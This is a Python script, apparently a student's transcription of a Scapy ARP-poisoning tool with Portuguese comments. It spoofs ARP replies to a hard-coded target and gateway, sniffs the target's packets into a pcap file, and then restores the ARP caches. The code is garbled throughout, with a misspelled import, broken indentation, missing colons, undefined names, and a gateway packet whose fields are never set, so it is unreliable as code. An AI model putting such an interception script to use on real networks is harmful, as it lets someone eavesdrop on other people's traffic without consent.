from scallpy.all import
import os
import sys
import threading

interface     = "en1"
target_ip     = "172.16.1.71"
gateway_ip    = "172.16.1.254"
packet_count  = 1000
poisoning     = True

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

  # slightly different method using send
  print"[*] Restoring target..."
  send(ARP(op = 2, psrc = gateway_ip, pdst = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 5)
  send(ARP(op = 2, psrc = target_ip. pdst = gateway_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 5)

def get_mac(ip_adress):
response,unanswered = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip_adress),timeout = 2, retry = 10)


#return the mac adress from a response

for s,r in response:
    return r [Ether].src

  return None

  def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
      global poisoning

      poison_target = ARP()
      poison_target.op    = 2
      poison_target.psrc  = gateway_ip
      poison_target.pdst  = target_ip
      poison_target.hwdst = target_mac

      poison_gateway = ARP()
      poison_target.op    = 2
      poison_target.psrc  = target_ip
      poison_target.pdst  = gateway_ip
      poison_target.hwdst = gateway_mac

      print "[*] Beginning the ARP poison. [CTRL-C to stop]"


      while poisoning:
        send(poison_target)
        send(poison_gateway)

        time.sleep(2)

      print "[*] ARP poison attack finished."

      return

      #set our interface
      conf.iface = interface

      #turn of output
      conf.verb = 0

      print "[*] Setting up %s" % interface

      gateway_mac = get_mac(gateway_ip)

      if gateway_mac is None:
        print"[!!!] Failed to get gateway Mac exiting"
        sys.exit(0)
      else:
          print "[*] Gateway %s is at %s" % (gateway_ip,gateway_mac)

      target_mac = get_mac(target_ip)

      if target_mac is None
        print "[!!!] Failed to get target MAC. Exiting."
        sys.exit(0)
      else:
          print "[*] Target %s is at %s" % (target_ip,target_mac)

#start poison thread
poison_thread = threading.thread(Target = poison_target, args =(gateway_ip,gateway_mac, target_ip, target_mac))
poison_thread start()

try:
    print[*]Starting Sniffer for %d packets" % packet_count

    bpf_filtter = "ip host %s" % target_ip
    packets = sniff(count = packet_count, filter = bpf_filtter, iface = interface)

except keyboardInterruption:
  pass

finally:
#escreva a captura dos pacotes

print[*] "Escreva a captura dos pacotes no arper.pcap"
wrpcap('arper.pcap', packets)


poisoning = False

#espere o poisoning sair do thread
time.sleep(2)

#restaura a comunicação

restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
sys exit(0)
